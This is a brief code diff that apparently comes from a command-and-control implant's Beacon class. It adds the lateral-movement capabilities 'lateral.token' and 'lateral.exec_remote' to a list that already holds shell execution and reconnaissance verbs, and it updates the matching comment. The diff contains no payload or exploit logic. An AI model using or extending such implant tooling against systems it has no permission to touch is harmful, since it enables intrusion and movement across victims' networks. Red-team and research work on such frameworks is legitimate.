@@ -29,8 +29,9 @@ internal sealed class Beacon
 {
     // The capability verbs the reference implant advertises at handshake
     // (architecture.md Sec 10). The teamserver gates dispatch on these: the core
-    // shell verb, the three recon verbs the runner implements, and lateral.move
-    // so a dispatched lateral task reaches the child-derivation handler.
+    // shell verb, the three recon verbs the runner implements, and the lateral
+    // verbs (move for child derivation; token and exec_remote for the standard
+    // access-token and remote-execution surfaces per ADR 0004).
     private static readonly string[] Caps =
     {
         "shell.exec",
@@ -38,6 +39,8 @@ internal sealed class Beacon
         "recon.hostenum",
         "recon.service",
         "lateral.move",
+        "lateral.token",
+        "lateral.exec_remote",
     };
 
     private readonly string _beaconUrl;
